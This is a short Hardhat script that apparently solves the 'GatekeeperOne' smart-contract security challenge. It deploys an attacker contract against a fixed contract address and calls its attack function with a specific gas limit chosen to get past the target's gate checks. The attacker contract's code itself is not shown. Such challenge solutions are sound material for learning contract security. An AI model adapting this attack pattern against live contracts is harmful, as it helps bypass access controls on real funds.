import { ethers } from "hardhat";

async function main() {
  const gatekeeperOne = await ethers.getContractAt("GatekeeperOne", "0x57594376615dFF81Ea9A575be74f7b25Abe76086");

  const GatekeeperOneAttacker = await ethers.getContractFactory("GatekeeperOneAttacker");
  const gatekeeperOneAttacker = await GatekeeperOneAttacker.deploy(gatekeeperOne.address);

  const tx = await gatekeeperOneAttacker.attack({ gasLimit: 51765 });
  await tx.wait(1);

  console.log("done!");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
